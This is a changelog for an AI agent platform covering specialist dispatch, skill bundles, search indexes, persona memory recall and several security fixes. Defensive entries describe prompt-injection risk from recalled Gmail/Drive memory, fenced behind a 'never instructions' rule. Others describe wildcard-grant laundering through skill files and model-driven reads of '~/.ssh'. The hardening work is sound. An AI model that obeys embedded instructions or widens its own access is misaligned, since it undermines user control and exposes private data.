# Changelog

All notable changes are documented in this file.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).

---
## [Unreleased]

### Added

- **`dispatch_task` can now hand a task to a NAMED non-coding specialist in
  trusty-code's roster, behind a fail-closed bridge-layer allow-set (#4026,
  #4028; epic #4021 bridge track).** The bridge previously hardcoded a single
  opaque target (`pm`), so a trusty-agents agent could never reach the
  `research`/`ticketing` specialists the owner's directive names. The tool
  gained an optional `specialist` argument and an optional
  HandoffContext-shaped `handoff` payload:
  - **Fail-closed allow-set (#4026, epic #4021 OQ-3/OQ-7).** A named
    specialist is resolved by `tools::cross_product::SubagentAllowSet` — the
    INTERSECTION of the bridge's own `NON_CODING_TARGETS` floor (`research`,
    `ticketing`) with the calling agent's new `[subagents].allowed` config
    list. Caller configuration can only ever NARROW that floor: a config that
    lists `rust-engineer` is still denied AT THE BRIDGE, per the owner's OQ-7
    ruling that enforcement is never caller-trusted alone. The default is
    EMPTY — an agent with no `[subagents]` section grants no cross-product
    reach at all, so this ships as no silent capability grant. A denial
    returns before the backend is invoked; nothing is dispatched. #4030's
    runtime-built domain authority will later feed the same `SubagentAllowSet`
    seam without touching the bridge.
  - **Propose-not-authorize envelope (#4028, epic #4021 OQ-6).** A named
    specialist's result is wrapped in `tools::cross_product::ProposalEnvelope`
    — origin agent, target agent, the CALLER's authority tier, and a
    `Disposition` marker that `for_cross_product` can only ever set to
    `Proposal`. This is DOC-41 §5.5's "propose-not-authorize, absolute for M1
    — no exceptions" made structural rather than conventional, mirroring
    #3078/AUTH-5's rule on `delegate_to_agent`: a caller holding
    `user_authority` has that tier RECORDED on the envelope but the
    specialist's output is still never an authorization — the holder acts on
    the proposal in its own turn, under its own identity. No new authority
    tier was invented; `CallerAuthority` names exactly the two states §5.5
    already describes, and reports the fail-closed `Standard` until
    #3074/AUTH-1 adds the `user_authority` field to `AgentConfig`.
  - **Minimal HandoffContext (#4028, OQ-6).** `tools::cross_product::HandoffContext`
    is a LOCAL copy of epic #2809's shape (`summary`/`relevant_state`/
    `constraints`, 4 KiB serialized cap) with NO dependency on #2809 landing —
    an over-cap payload is a recoverable error and the target is never
    invoked.
  - **Unchanged for every existing caller.** Omitting `specialist` is
    byte-identical to pre-#4026 behaviour: same `route_task` derivation, same
    default target (`pm`), same bare scrubbed transcript back with no
    envelope. `scrub_branding` and the RBAC tier gate are untouched, and the
    widened schema still names no backend and enumerates no roster.

- **Function skills — grant a whole capability with one line** (issues #4022,
  #4023, #4025; part of epic #4021): the skill catalog gains a *bundling* tier
  above the one-skill-per-tool base shipped in #3964. A `SkillKind::Function`
  row names a fixed, compile-time set of member skill ids instead of wrapping a
  tool, and naming it in `[skills].allow` grants every member (epic #4021's
  OQ-1, resolved *grant-the-bundle* by the owner on 2026-07-26). The first
  exemplar is **Ticketing**, bundling the ten existing `ticket-*` leaf skills.

  The 1:1 model is untouched: every tool still maps to exactly one leaf skill,
  every leaf stays independently grantable, and a bundle **compiles down** to
  those leaves inside `SkillCatalog::expand` — *before* the three permission
  layers run. The 1:1 layer and the allow-glob/RBAC/scope gates therefore never
  see a bundle id, only exact leaf tool names, so #3964's defence in depth
  (exact ids, no glob dialect, the glob-laundering fix) applies to a bundle
  unchanged and is pinned by
  `function_skill_never_leaks_its_bundle_id_into_the_tool_patterns`. Bundles are
  built-in `const` data only — the authored `.md` frontmatter dialect has no
  `members:` key and its parser requires a `tools:` list, so no file dropped
  into a skill source can widen one grant into N. A bundle naming a member no
  manifest resolves is a **manifest validation error** caught at build/test time
  (`SkillCatalog::unknown_function_members`, a `debug_assert!` in
  `SkillCatalog::builtin`, and `builtin_function_skills_declare_only_known_members`
  in CI) rather than a runtime surprise; if one ever reaches production anyway,
  expansion still narrows — the member contributes zero tools and is reported in
  `unresolved`, never "all tools".

  `GET /api/agents/:name/skills` surfaces bundles **additively**: every field a
  pre-#4022 consumer reads keeps its name, type and meaning. Function skills
  appear as ordinary `skills[]` cards with `kind: "function"`, and every card —
  leaf or bundle — now carries `members`, `granted_members` and a tri-state
  `granted_state` (`"all"`/`"some"`/`"none"` of the members) so a consumer needs
  no kind check to read a field. A new top-level `groups[]` index gives the
  Skills pane (#4024) group headers without re-deriving membership, and is built
  from the same single computation as the cards so the two can never disagree.
  The boolean `granted` keeps its old meaning — for a bundle it is
  `granted_state == "all"`, the conservative answer — and `granted_count` still
  counts capabilities, excluding bundles.

  Per the domain authority (epic #4021 section D), the ticketing *domain* routes
  to the subagent modality when one is available; the Ticketing function skill
  is the direct-skill fallback, and its description says so.

### Changed

- **`PmBridgeBackend::run` gained a `target: Option<&str>` parameter (#4026).**
  `None` preserves today's exact command line. Only the tcode leg honours a
  target; the tm leg has no per-agent selector and deliberately ignores one
  rather than mis-routing (the tool forces the tcode leg whenever a specialist
  is named, so this is unreachable in practice).
- **`AgentConfig` gained an optional `[subagents]` section (#4026).**
  `SubagentsConfig { allowed: Option<Vec<String>> }` — a struct rather than a
  bare list so #4029's Sub-agents configuration section can add fields without
  a breaking config change, exactly as `SkillsConfig` was shaped. Absent =
  EMPTY, never "all". Exact names only, no glob dialect.

### Fixed

- **Streamed replies no longer flash blank or "(no narrative)" the moment a
  task finishes** (issue #3759): in browser mode the GUI's SSE→web-bus bridge
  emitted a `task-complete` with a hardcoded empty narrative on every
  `session_done`, racing the poll loop's `task-complete` that carries the real
  text. Last writer won, and with token streaming (#3753) `session_done`
  normally landed first — up to a poll interval ahead — wiping freshly streamed
  prose mid-read. `session_done` now stays off the web bus entirely (its status
  bookkeeping already flowed through the workflow store and the Events log), so
  a task's narrative has exactly one emitter per transport. Two consequences,
  both deliberate: a foreign session finishing mid-turn — the `/api/events`
  stream is a process-wide broadcast — no longer clears this tab's spinner; and
  the spinner now stops on the poll-driven completion rather than on the SSE
  event, so it runs up to one poll interval longer (250ms for the first ~5s of
  a turn, 500ms after). That bound is the price of a single narrative emitter
  and errs the safe way — a spinner that over-runs reads as "still working",
  where stopping early reads as "done" over text that has not arrived.

- **Relay token compared in constant time; reply identity validated
  server-side** (issue #3761): `POST /api/internal/relay-event` compared its
  shared secret with `==`, which short-circuits on the first differing byte and
  leaks the matching-prefix length to a caller able to time its own requests —
  now a constant-time byte comparison via `subtle::ConstantTimeEq` (length is
  still checked first; a token's length is not secret). The same treatment is
  applied to the API bearer token in `auth_middleware`, which is the
  higher-value of the two secrets since it gates every `/api/*` route. The
  `SlackReplySent` arm also published `identity` completely unchecked, so any
  holder of the relay token could stamp a reply with a fabricated speaker such
  as "CTO Bot (as Bob)" and the mirror pane would render it as truth. The
  server knows the one honest value (`slack::BOT_IDENTITY`) and now rejects
  anything else with `422`, mirroring the existing closed-set RBAC tier check
  on the inbound half.

- **`cto-assistant`'s Gmail and Google Tasks tools are no longer scope-denied at
  dispatch** (issue #3938): the bundled `cto-assistant` DIRECTORY PACKAGE
  (`.trusty-agents/agents/cto-assistant/agent.toml`), which wins the loader's
  resolution order over the flat `cto-assistant.toml`, declared no
  `[tools].scopes` — so it inherited only the base assistant's `google.read` by
  union. No gworkspace tool ever advertises that scope: discovery maps every
  `x-google-scopes` OAuth URL to `google.<family>.<access>` (`google.gmail.write`,
  `google.tasks.write`), and `ScopePattern::matches` compares on segment
  boundaries, so `google.read` matched nothing and the per-agent scope gate in
  `filter_persona_tool_names` (#3208) dropped the persona's entire Gmail/Tasks
  surface before the model saw it. The package now declares
  `scopes = ["google.gmail.*", "google.tasks.*"]` explicitly — narrowly, the two
  families its allowlisted tools actually need, not a blanket `google.*` —
  restoring the line the flat file has always carried and that the package
  conversion dropped. A new test resolves the SHIPPED package through the real
  loader, derives each tool's dotted scope from the real `trusty-gworkspace`
  `rpc.discover` document, and runs the real dispatch-time filter, so
  re-dropping the declaration fails in CI instead of at a user's dispatch.

- **Streamed chat turns now send the same sampling parameters as the blocking
  path** (issue #3758): `llm::stream::stream_reply` built its
  `OpenRouterProvider` with no temperature, token ceiling, or stop sequences, so
  a streamed conversational/persona reply ran on provider defaults while the
  blocking fallback for the SAME turn sent `llm.temperature`, `llm.max_tokens`,
  and `llm.stop_sequences` — the streamed and fallback answers could differ in
  style, verbosity, and where they stopped. Both call sites (the persona turn
  and the conversational fast path) now forward their turn's exact values,
  including the conversational path's `effective_max_tokens`, which the
  local-route branch may override.

- **A truncated stream no longer renders as a complete answer** (issue #3757):
  `stream_with_provider`'s empty-stream guard only caught a stream that produced
  NOTHING, so a partial-then-truncated stream returned its cut-off text as a
  success and the blocking fallback never engaged. The upstream pump now emits
  `ChatEvent::Error` for a mid-stream error frame, a truncated EOF, and an
  unusable non-SSE 200, so those surface through `assembly.error` and the caller
  falls back to the blocking chat path.

### Added

- **Agents can attach arbitrary trusty-search indexes, and `vector_search` now
  advertises them** (issues #3232, #4009; part of epic #4007): an agent's
  `[[stores]]` binding is the *curated* knowledge tier — one OKG store per
  agent, and that stays. Everything else an agent should be able to search (a
  third-party repo, a shared doc corpus) now has a second, uncurated tier:
  `[tools] search_indexes = ["apex", "cto-projects"]`, a plain list of
  trusty-search index ids with no tree, palace, or ingestion behind them. The
  list unions base-first through `extends` exactly like `[tools].allow` and
  `scopes`, so a CTO Assistant extending a base Assistant adds `cto-projects`
  without re-declaring — or being able to silently drop — what the base
  attached, and it is reported by `GET /api/agents/:name/stores` (alongside the
  curated stores, not mixed into them) and in the agent catalog. Those two
  `/stores` fields — `search_indexes` and `enforce_search_indexes` — are an
  **interim raw surface** licensed by DOC-58 §5: the resolved declared list and
  the knob state, with no daemon probe behind either. The forthcoming
  `/knowledge.attached_indexes[]` route is the probed, authoritative surface
  for the GUI. Both must report the same id set, so declaring one id in *both*
  tiers — legal, and accepted by the tool from either — is deduped server-side
  and presented once under its bound role.

  `vector_search` reads that list twice over. Its `index_id` schema description
  now **enumerates** the agent's bound store plus every attached index, closing
  the discoverability half of #4009: querying another corpus was always
  mechanically possible, but the model had to *guess* an id that happened to
  exist because the tool advertised no list. Second, `[tools]
  enforce_search_indexes = true` turns that same list into a fail-closed
  allowlist — an explicit `index_id` outside `{bound store} ∪ search_indexes`
  is refused with an error naming the permitted set, and is deliberately **not**
  degraded to the local index, since answering a refused request from a
  different corpus is worse than refusing.

  **Enforcement is opt-in and defaults to off** (owner decision on epic #4007's
  OQ-2 — declarative-only at M1). `vector_search` has never gated `index_id` in
  production, so failing closed by default would break every persona that
  cross-queries today. An agent that is unenforced *and* declares no attached
  indexes is byte-identical to before: the same resolution path, and a schema
  whose bytes are pinned unchanged by test, since a tool definition is prompt
  input and drift there would alter every existing agent's context. An
  **enforced** agent's schema always states the restriction, including the
  bound-store-only lockdown case (`[[stores]]` + `enforce = true` + no
  `search_indexes`) — the schema describes what the tool accepts, so silence
  there would advertise an open corpus over closed behaviour.

- **`GET /api/events` can scope the Slack mirror to one channel** (refs #3760):
  `SlackMessageReceived` / `SlackReplySent` carry no `session_id`, and
  `/api/events` treats a missing session as "always include", so every
  connected client receives every Slack channel's inbound message text and bot
  reply — harmless for the single-operator demo, a cross-viewer leak the moment
  a second client attaches. The stream now accepts an optional `channel` query
  parameter that scopes the mirror to one Slack channel id (the same key the
  gateway already keys its session state by, exposed as
  `Event::slack_channel()`). **This is the server-side capability only.** No
  client passes `channel=` yet and the mirror pane has no viewer→channel
  binding, so the leak #3760 describes persists in the product until the client
  side lands — tracked separately. **Compatibility: the parameter is optional
  and absent means no filtering**, so an existing client — including the
  shipped GUI, which opens the stream with no query params — receives exactly
  what it received before. Events with no channel (keepalives, task telemetry,
  and `ListenerEventReceived`, which is provider-generic and carries a
  `listener_id` rather than a channel) always pass a channel filter rather than
  being suppressed. `EventsQuery` is `deny_unknown_fields`, so a typo'd
  `?channel_id=` is rejected instead of silently returning an unfiltered
  stream — these filters fail open when absent, so a misspelling must be loud.

- **Skill-wrapping runtime — one named skill per tool (#3933, DOC-57 §5, epic
  #3931):** a skill had no binding to the tool it described. `web-search.md`
  documented `web_search` while `[tools].allow` granted it separately, so
  deleting either half left the other silently lying. Skills now wrap tools 1:1
  (owner decision 2026-07-25, resolving DOC-57 OQ-2), each with a human,
  provider-recognisable name — `get_train_schedule` is "MTA Train Time",
  `search_gmail_messages` is "Gmail Search". Ships a compile-time catalog of
  ~180 rows covering every in-process tool plus the Google Workspace surface and
  the platform tools the checked-in roster grants, three deliberately tool-less
  skills (guidance with no executable member, which the owner's model admits
  explicitly), and a coverage test that FAILS when a tool is added without a
  skill — that failure is the mechanism, not a nuisance.
- **`[skills].allow` in `agent.toml`:** a list of skill ids that compiles down to
  the exact tool names it wraps and is UNIONED with `[tools].allow`, so adding a
  `[skills]` line can never remove a capability the agent already had. The
  compiled list feeds the EXISTING `filter_persona_tool_names` gate on the
  persona-chat path and the existing `scope_assistant_allowed_tools` gate on the
  `--direct`/subprocess path — no enforcement moved, so the RBAC tier filter, the
  scope gate, and `persona_allowed_tools`'s never-`None` behaviour are untouched.
  An unknown skill id expands to zero tools and is reported, never to "all
  tools": resolution can narrow capability, never widen it. Union-merged across
  `extends`, matching `[tools].allow`.
- **`GET /api/agents/:name/skills`:** the agent's resolved capability set — every
  catalog skill with a `granted` flag computed by the same matcher dispatch uses,
  the one tool it wraps, its provider requirement, `unresolved[]` for dangling
  skill ids, and `unmatched_patterns[]` for allow-globs no catalog skill claims
  (reported with the honest reason that they may still resolve to a live-
  discovered MCP tool). Read-only; editing arrives as `PATCH { skills_allow }`.
- **`tools:` / `kind:` / `display_name:` in skill frontmatter:** an authored
  `.md` in any skill source can now bind itself to the tool it documents and
  supersede the built-in row. `.trusty-agents/skills/web-search.md` is the
  migration exemplar. `name` is deliberately unchanged there — it is the key the
  prompt-injection registry indexes by, so renaming it would break
  `load_skill("web-search")`; `display_name` carries the pane's name instead, and
  the built-in row's credential requirement is inherited rather than dropped.

### Security

- **A skill manifest can no longer launder a wildcard tool grant (#3933):**
  `tools:` entries in an authored `.md` were taken verbatim and merged into the
  patterns `match_any_glob` consumes, which reads a trailing `*` as a prefix
  wildcard. A skill file declaring `tools: ["*"]` — ordinary content in any
  skill source, not reviewed like `agent.toml` — would therefore let one
  innocuous `[skills].allow` id carry `[tools].allow = ["*"]` authority behind a
  card rendering as a single narrow capability. That is strictly worse than the
  raw glob it replaces, because the reviewer reading `agent.toml` sees a tidy
  skill id and no wildcard at all. DOC-57 S-1 already required exact names;
  nothing enforced it. Glob metacharacters (`*`, `?`, `[`, `]`), empty names and
  padded names are now rejected at three independent layers — manifest parse,
  catalog insert, and expansion — and a manifest with any invalid entry is
  dropped whole (loudly logged) rather than silently narrowed to its valid half.
  Found by code-critic on PR #3964; mutation-verified.

### Fixed

- **`GET /api/agents/:name/skills` read a narrower catalog than dispatch
  (#3933):** the route built a built-in-only catalog while both dispatch paths
  built built-in + authored, so an authored-only skill id was reported to the
  user as a dangling `unresolved[]` reference even though it resolved and
  granted at runtime, and authored overrides (`web-search.md`'s name) never
  reached the pane. The route now builds the catalog exactly as dispatch does.
- **Skill-source precedence was silently inverted (#3933):**
  `skills/sources/mod.rs` documents "higher-priority sources scanned first,
  first writer wins", but the authored-overlay loop let a later (lower-priority)
  manifest evict an earlier (higher-priority) one. Conflicts now displace only
  built-in rows, so among authored manifests the first source wins while
  authored still beats built-in.

### Changed

- **Skills pane renders resolved capability instead of glob prefixes (#3933):**
  #3932's placeholder grouped `[tools].allow` by the substring before the first
  `_` and badged every card `synthetic`. It was honest about being a guess, but
  it showed the user prefix fragments and could not say whether anything
  resolved. The pane now reads `GET …/skills`: human-named cards grouped by kind,
  each showing the single tool it wraps and its credential state. A credential
  reads CONFIGURED only when an environment variable actually resolved; an OAuth
  grant reads "not verified" rather than a green chip nobody checked. The
  client-side `synthesizeSkills` derivation is removed with its tests.

- **OKG ingestion feeds the bound search index (#3892, remediation (a)):** an
  `okg_ingest_*` call used to write markdown into the KB tree and stop there,
  while `vector_search` queried an index built over an unrelated root — so an
  ingest could report "N entities ingested" truthfully and the assistant would
  still find nothing, with no error on either side. Every ingest tool now ends
  by draining that source's index backlog into the agent's `[[stores]]`-bound
  trusty-search index (`stores::index_feed`, over the daemon's
  `POST /indexes/{id}/index-file` / `remove-file` routes). The contract: the
  tree write is the durable record and is never gated on a reachable daemon;
  the journal line is appended only AFTER the daemon acknowledges the push, so
  a crash costs one redundant re-push rather than a lost entity; every run
  reconciles the whole backlog, so a failed push is self-healing; a changed
  entity is withdrawn before it is re-pushed and a tombstoned one is withdrawn
  outright. Fail-open, never silent — each result reports `index.indexed` /
  `removed` / `pending` plus a `reason` when nothing could be fed. The
  operator's configured index roots are untouched (remediation (b) was not
  taken). One constraint the live check surfaced and the feed now enforces:
  trusty-search post-filters any search result whose path escapes the index
  root (issues #64 / #541), so pushing a tree into a foreign-rooted index would
  store the chunks and hide them from every query. The feed reads the index's
  root first and REFUSES with an actionable reason when it does not contain the
  tree, rather than reporting `indexed: N, pending: 0` over a corpus nothing can
  return.
- **`okg://<agent>` finally resolves (`stores::binding`, #3892):** the URI was an
  opaque label nothing ever mapped to a path, so a binding's tree tail matching
  its KB directory was a naming coincidence rather than an invariant. It now
  resolves to `<knowledge_dir>/<slug(agent)>`, and a push is REFUSED when the
  binding names a different tree than the one that was written — trading a
  silent-empty failure for a loud one instead of a silent-wrong one.

### Changed

- **Store status surfaces the unsearchable backlog (#3892):** `okg_sources`
  reports per-source `index.synced` / `index.pending` and names the bound index;
  `GET /api/agents/:name/stores` adds the resolved `tree_path` plus
  `pending_index` / `synced_index`, so a store can no longer read as CONNECTED
  while holding none of the content its tree holds.

### Changed

- **Agent configuration is five sections: Personality / Knowledge / Skills /
  Listeners / Permissions (#3932, GUI):** per the owner's directive — *"Instead
  of tools, let's show skills"* — the config takeover's tab strip is reshaped to
  DOC-57's normative order and re-backed, not merely relabelled. **Knowledge**
  widens the old OKG Stores tab from store bindings alone to one pane over three
  sub-surfaces: the live bindings, the `vector_search`→store linkage resolved
  from the agent's own allow-list, and the declared MCP knowledge endpoints
  (which report `trusty-memory` and `trusty-search` as *disabled* — their
  shipped default — rather than quietly omitting them). **Skills** replaces the
  Tools tab's single monospace textarea of raw globs with capability cards
  grouped by tool-name prefix, each badged `synthetic` because no skill manifest
  wraps its tools yet — so the unwrapped surface stays visible and wrapping
  progress becomes measurable. **Permissions** moves last and stops being a chip
  list: each mechanism now carries an explicit *enforced* / *not enforced*
  marker, states the deny-on-absent polarity of an empty allow-list, and names
  what it cannot see (values inherited through `extends`, the reserved
  `user_authority` field, and the tier/autonomy model with no read path).
  Front-end only: no new HTTP route, no config-schema change, independently
  revertable. The panel is split into one component per section with the persona
  edit buffer and dirty aggregation kept in the shell, so an in-progress prompt
  survives a section switch and every exit path still routes through the
  unsaved-changes guard.

### Removed

- **The Tools tab's glob textarea, and with it GUI editing of
  `[tools].allow` (#3932):** capability is now shown as skills, and editing
  returns as `PATCH { skills_allow }` over skill names rather than over the
  globs beneath them (DOC-57 §5.7). Until then `agent.toml` is the edit surface,
  which the Skills pane says outright.
- **The Listeners pane's hardcoded "not bound" badge (#3932):** it asserted a
  per-agent binding state for every agent regardless of configuration, inventing
  a listener that may not exist and hiding one that is quietly failing. The pane
  now labels itself as connector scaffolding until `GET /api/agents/:name/listeners`
  lands (#3937). The Personality pane's fabricated per-connector-instructions
  list is gone for the same reason — it enumerated connectors it had never
  looked at.

### Added

- **Personas now recall their bound palace memory and describe it truthfully
  (#3928):** an agent's `[[stores]]` binding (#3878) was inert on the chat path
  — only `default_search_index()` was read (to route `vector_search`), so
  `binding.palace` never reached inference and the runtime handed the model no
  memory at all. Izzie consequently told the owner *"I don't have memories that
  persist across conversations — each time we talk, I start fresh"* while her
  `owner-profile` palace held her `identity` drawer plus ~10 profile drawers and
  her `bob-kb` index (552 chunks) was live and connected. Each persona turn now
  (a) unconditionally injects the agent's `identity`-tagged drawers and
  semantically recalls the turn's query against the bound palace, clearly framed
  as persistent memory; (b) prepends an **introspected** memory-architecture
  section built from live probe data — palace id and whether it answered, index
  id, real chunk count — never a hardcoded "you have infinite memory" literal
  (introspection over injection); and (c) persists the turn to the bound
  palace's chat-session store as one continuous, resumable session per agent
  (`persona-{agent}`), off the response path. Fails open at every step: an
  unreachable daemon renders "temporarily unreachable — your stored memories
  still exist", never an absence of memory, and an agent with no `[[stores]]`
  binding sees a byte-identical prompt to before. The memory block is appended
  last so the whole preceding prompt prefix stays cache-stable (DOC-54 §9.6.3).
  Recalled drawer content is UNTRUSTED — it arrives from Gmail/Drive ingestion
  and the agent's own `memory.write` scope, and lands in the system message of a
  persona holding `compose_email`, `manage_drive_file`, and `delegate_to_agent`
  — so it is fenced in a `<recalled_memory>` envelope with an explicit
  "reference data, NEVER instructions" preamble, and every line is neutralized
  (envelope tag escaped, fences collapsed, leading `#` escaped, mandatory
  indent) so no drawer can reach column 0 and pose as prompt structure or close
  the envelope. The base `assistant` persona template gains matching guidance —
  inherited by every persona via `extends` prose concatenation — forbidding the
  false stateless self-description, barring overclaiming, and making the block's
  factual precedence explicitly subordinate to the never-follow-embedded-
  instructions rule.
- **Agent configuration takes over the pane (#3894, GUI):** opening the gear no
  longer wedges the agent–OKG–tool–listener surface into a 320px strip above
  the chat scrollback — it now takes over the entire content area (chat column
  *and* recap rail), giving the concept centerpiece the room it needs. Chat is
  covered, never unmounted: the takeover is an absolutely-positioned sibling of
  a still-mounted, `inert` chat subtree, so leaving configuration returns to
  chat exactly as it was — same scroll offset, same half-typed message in the
  composer. Exits: a "Back to chat" button, a close button, and <kbd>Esc</kbd>
  (unmodified only, so platform chords like Cmd+Esc are left alone); switching
  to the Events tab also drops the takeover. Every existing section — OKG
  Stores, Tools, Permissions, Listeners scaffolding, and the per-section save
  flow — is unchanged. Unsaved Personality/Tools edits are never discarded
  silently: every exit path (Esc, Back, Close, and the Chat→Events tab switch)
  stops on a confirm offering Save and close / Discard / Keep editing. The
  agent being configured is pinned when the takeover opens, so a background
  agent switch (the Sidebar's resume-workstream flow) can no longer retarget an
  open panel or throw away what is typed in it.

- **Live OKG store bindings — the FIRST leg of the agent-config triple
  (#3816, DOC-54 SPEC-AGENTS-04 §5.1):** `agent.toml` gains `[[stores]]`,
  declaring what an agent KNOWS alongside how it ACTS (`[tools]`) and REACTS
  (`[[listeners]]`). A binding names an OKG knowledge tree (`okg://<agent>`),
  the trusty-search index built over it, and optionally a trusty-memory
  palace. Both spellings parse: the rich `[[stores]]` array-of-tables and the
  product spec's `[stores] allow = [...]` shorthand (which derives tree and
  index). New `crate::stores` module resolves each binding LIVE at request
  time against `GET /indexes/{id}/status` and
  `GET /api/v1/palaces/{id}/drawers`, reporting connected + chunk count /
  root / readiness, or not-connected + a human-readable reason. Nothing here
  is fatal: an unknown index, a down daemon, or a malformed binding degrades
  to a reported disconnect — the agent still boots. Under `extends`, a
  child's `[[stores]]` REPLACES the base's rather than unioning (exactly one
  store per agent), so a personalization overlay's own index is the default
  search target.
- **`GET /api/agents/:name/stores`:** sidecar route returning each binding's
  live status plus any non-fatal config `issues`. Malformed agent TOML
  returns `200` with a `config_error` field rather than a 500, so one bad
  hand-edit cannot blank the config panel.
- **Bundled seed bindings for the demo personas:** `izzie` binds
  `okg://izzie` → trusty-search `bob-kb` + palace `owner-profile`;
  `cto-assistant` binds `okg://cto-assistant` → trusty-search
  `cto-assistant` + palace `cto`. Seeded in the embedded provisioning source
  of truth (`.trusty-agents/agents/`), both the directory packages and their
  flat shadows, with regression tests asserting that the embedded bytes of
  EVERY seed spelling — package and flat shadow alike — still carry each
  binding and grant `vector_search`. A reprovision that dropped either, or an
  edit that updated the package but not its load-bearing `extends`-shadow
  counterpart, would otherwise fail silently. `izzie`'s `[tools].allow` now
  grants `vector_search` so her binding is actually reachable.
- **Durable compression-effectiveness telemetry — RTK + agents-ws-summary surfaces (closes [#3870](https://github.com/bobmatnyc/trusty-tools/issues/3870), refs [#3867](https://github.com/bobmatnyc/trusty-tools/issues/3867), epic [#3866](https://github.com/bobmatnyc/trusty-tools/issues/3866) Slices D + A):** a new `compression` module (`CompressionRecord`, `rtk_compression_record`, `ws_summary_compression_record`, `append_compression`) appends one JSONL line per event to `<project_dir>/.trusty-agents/state/compression.jsonl`, mirroring `usage::append_usage`'s append-only convention. Two call sites feed it: `llm::tool_loop`'s per-tool-result compression step now uses `compress_tool_output_async_with_path` (issue #1959) instead of the stats-free wrapper, so the bytes-before/after and RTK-vs-native-fallback signal are no longer discarded (best-effort, spawned off the hot path so a slow disk never stalls a tool result from reaching the model); `ctrl::pm_task::dispatch::classification::maybe_summarize_workstream`'s per-workstream summary refresh now records its own token-shrinkage and LLM round-trip duration (`surface: "agents-ws-summary"`) into the same sink — one writer, two surfaces.
- **OKG builder tools — the base assistant can now BUILD its own knowledge
  graph (epic #3052):** four tools registered into the assistant tier, backed by
  the new `trusty-kb::okg` engine (which owns every idempotency guarantee and
  stays pure and network-free).
  - `okg_ingest_docstore` — point the KB at a directory of text documents.
    Unchanged files skip on a content hash, edited files replace their prior
    entry, binary files are skipped and reported, deletions are surfaced (or
    tombstoned with content preserved).
  - `okg_ingest_gmail` — query + date-window ingestion. The ledger is consulted
    BEFORE the body fetch, so a message is pulled exactly once, ever; widening
    `after` further back in time re-lists the covered window but only pays for
    the genuinely older messages. Deletion detection is off — a windowed pull
    can never prove a message is gone.
  - `okg_ingest_drive` — folder-scoped and revision-aware. The list call
    carries `version`, so an unchanged file is skipped without downloading and
    a new revision re-ingests. Deletion detection is enabled only for a
    complete recursive listing.
  - `okg_sources` — read-only status view: kind, locator, destination
    collection, item and tombstone counts, oldest/newest coverage, last run.
  Registration is folded into ingestion, so "point at this directory" and
  "reach further back in time" are the same idempotent call and a window can
  never desync from its ledger. All four are added to the base `assistant`
  persona's `[tools].allow` and registered into BOTH assistant dispatch paths
  (`build_assistant_tier_registry` and the persona-chat path), avoiding the
  divergence #3745 item C had to fix for the izzie tools.
- **`[okg]` config section** — `docstore_roots` in `~/.trusty-agents/config.toml`
  is the operator-controlled allow-list of directories `okg_ingest_docstore` may
  read. `~`-expandable and defaulting to `$HOME`, with every hidden path below a
  root refused, so ordinary corpora work out of the box while credential
  directories never do. Widening it is a deliberate act: anything reachable
  becomes searchable and quotable in chat.

- Gmail and Drive fetching reuses `trusty-gworkspace`'s authenticated
  `BaseClient` — no second OAuth path, no browser prompt. List calls go through
  `BaseClient::get` with our own field sets because the crate's convenience
  wrappers hardcode `fields` and drop `nextPageToken` (Drive's does not even
  request it), which makes a bulk backfill impossible through them. Google's
  soft-error responses (403/404 arrive as a success value carrying an `error`
  key) are detected and raised rather than silently reported as an empty page.

### Security

- **`okg_ingest_docstore` is confined on the READ side.** Its `path` was a
  free-form model-supplied string with only an `is_dir()` check, which made the
  default base assistant — and every persona extending it — capable of reading
  arbitrary local files (`/etc`, `~/.ssh`) into a searchable KB. Paths are now
  checked against `[okg] docstore_roots` before registration AND again inside
  the engine on every run, so a poisoned registry row cannot replay the read.

### Fixed

- **`listeners::store::EventStore`'s `$HOME`/`HOME_LOCK` cross-test race
  closed via dependency injection (issue #3922).**
  `dedup_seed_loads_recent_ids` failed once in CI (run 30165303605) with
  `assertion failed: ids.contains("id2")`, then passed on rerun. Root cause
  (confirmed by local reproduction, not just inferred): `llm::http::tests`'s
  five credential-resolution tests sandbox `$HOME` under
  `#[serial_test::serial]` ALONE — a `std::sync::Mutex` (`HOME_LOCK`) can't
  be held across `.await`, so they never take it — while `listeners::store`'s
  own tests sandboxed `$HOME` under `HOME_LOCK` alone. The two groups never
  actually excluded each other. Looping just these two test groups together
  under maximised parallelism reproduced the failure at 2/5 runs, with a
  captured panic (`ids.contains("id1")` / a spurious ENOENT opening another
  test's already-removed tempdir) matching the CI failure's shape. New
  `EventStore::append_at`/`read_events_at`/`recent_ids_at`/`load_filters_at`/
  `set_filter_at`/`is_event_type_included_at` let a caller inject its target
  directory directly instead of relying on the shared `$HOME`; every test in
  `listeners::store::tests` now uses this seam and no longer touches the
  process environment at all, so it can never again be a party to this race
  regardless of what any other test in the crate does to `$HOME`. Production
  behaviour is unchanged (the plain, non-`_at` methods still resolve
  `events_dir()` from `$HOME` exactly as before). A `#[cfg(test)]`-only guard
  in `events_dir()` now panics on the first run of any FUTURE test that
  reaches it without the CALLING thread holding `HOME_LOCK`, turning the
  next instance of this omission into a deterministic failure instead of a
  flake. A new standing regression guard,
  `concurrent_event_store_scenarios_survive_home_env_hammering` (issue
  #3925), runs four `EventStore` scenarios concurrently against a
  background task that hammers `$HOME` with zero synchronization — the exact
  #3922 attack shape — and asserts none lose data; validated to fail
  deterministically (not probabilistically) when the DI seam is reverted.
  **Code-critic follow-up (HIGH, fixed):** the guard's first version checked
  `HOME_LOCK.try_lock().is_ok()` — global contention, not per-caller
  ownership — so a background thread holding the lock for an unrelated
  reason masked a genuinely unguarded caller on a different thread (the
  critic reproduced this directly). New `crate::test_env::lock_home()` /
  `home_lock_held_by_this_thread()` track ownership via a thread-local flag
  instead (sound because every test in this crate uses the default
  current-thread `#[tokio::test]` runtime), and `listeners::poll`'s cursor
  tests plus the `api::server`/`slack` handler-level tests that still
  sandbox `$HOME` directly were migrated to the new helper. A new test,
  `events_dir_panics_when_a_different_thread_holds_home_lock`, pins the
  exact masking scenario the critic found. Stress-testing this fix (60+
  loop iterations of the full affected test set under `--test-threads=16`)
  also surfaced an unrelated, pre-existing bug: `EventStore::append_at`
  never called `.flush()` after `write_all`, so `tokio::fs::File`'s
  background write could still be in flight when a separate `read_events_at`
  call opened a fresh handle to the same path — observed as an intermittent
  "0 events immediately after appending 1" under heavy concurrent test load.
  Fixed with an explicit `.flush().await`.
- **Instructions editor is a first-class editing surface (#3894, GUI).**
  #3862's `55vh`/`70vh` clamp fixed a 2-line strip by trading it for a field
  capped independently of the space available — dead area below it on a tall
